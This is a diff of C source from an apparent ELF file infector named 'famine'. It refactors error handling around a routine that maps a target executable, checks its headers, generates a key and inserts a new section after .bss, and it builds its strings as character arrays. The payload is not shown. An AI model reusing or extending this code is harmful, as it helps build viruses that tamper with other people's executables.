@@ -1,12 +1,6 @@
 #include "famine.h"
 
-void	exit_clean(struct s_woody *woody, int exit_status) {
-	if (syscall_wrapper(__NR_munmap, woody->bin_map, woody->bin_st.st_size + BYTECODE_SIZE) == -1)
-		ERROR_SYS(((char []){'m','u','n','m','a','p','\0'}));
-	syscall_wrapper(__NR_exit, exit_status);
-}
-
-void	exit_woody_mod(struct s_woody *woody) {
+void	clean_woody(struct s_woody *woody) {
 	if (syscall_wrapper(__NR_munmap, woody->bin_map, woody->bin_st.st_size + BYTECODE_SIZE) == -1)
 		ERROR_SYS(((char []){'m','u','n','m','a','p','\0'}));
 }
@@ -45,21 +39,21 @@ bool	map_file(char *elf_filename, struct s_woody *woody) {
 	syscall_wrapper(__NR_close, fd);
 	if (bytes_read == -1) {
 		ERROR_SYS(((char []){'r','e','a','d','\0'}));
+		syscall_wrapper(__NR_munmap, woody->bin_map, woody->bin_st.st_size + BYTECODE_SIZE);
 		return (false);
 	}
 	return (true);
 }
 
-void	gen_random_key(struct s_woody *woody, struct s_key *key) {
+bool	gen_random_key(struct s_key *key) {
 	long key_length;
 
 	if ((key_length = syscall_wrapper(__NR_getrandom, key->raw, KEY_SIZE, 0)) <= -1) {
 		ERROR_SYS(((char []){'g','e','t','r','a','n','d','o','m','\0'}));
-		exit_clean(woody, EXIT_FAILURE);
+		return false;
 	}
 	key->length = (size_t)key_length;
-	key->raw[0] = 0;
-	key->length = 0;
+	return true;
 }
 
 void	woody_mod_c(char *target) {
@@ -67,15 +61,20 @@ void	woody_mod_c(char *target) {
 
 	famine.woody.target = target;
 	if (!map_file(target, &famine.woody))
-		syscall_wrapper(__NR_exit, EXIT_FAILURE);
+		return ;
 
-	read_elf_header(&famine.woody);
-	check_headers_offset(&famine.woody);
+	if (!read_elf_header(&famine.woody))
+		clean_woody(&famine.woody);
+
+	if (!check_headers_offset(&famine.woody))
+		clean_woody(&famine.woody);
+
 	get_shstrtab(&famine.woody);
 
-	gen_random_key(&famine.woody, &famine.woody.key);
+	if (!gen_random_key(&famine.woody.key))
+		clean_woody(&famine.woody);
 
 	insert_section_after_bss(&famine.woody);
 
-	exit_woody_mod(&famine.woody);
+	clean_woody(&famine.woody);
 }
